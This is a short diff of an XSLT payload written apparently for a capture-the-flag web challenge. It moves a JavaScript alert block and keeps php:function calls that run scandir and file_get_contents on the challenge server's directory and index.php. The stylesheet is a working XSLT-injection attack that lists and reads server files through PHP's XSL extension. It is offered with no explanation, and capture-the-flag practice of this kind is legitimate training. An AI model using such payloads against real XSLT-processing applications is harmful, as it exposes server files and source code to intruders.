@@ -3,14 +3,13 @@ xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:php="http://php.net/xsl"
 xmlns:func="http://exslt.org/functions"
 >	
+<func:script language="javascript" >
+alert(4);
+</func:script>
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
 <xsl:param  name="strscand"   select="php:function('implode',@shandle,'')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
-<func:script language="javascript" >
-alert(4);
-</func:script>
- 
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
  DIR2 implode:<xsl:value-of select="$strscand"/>     
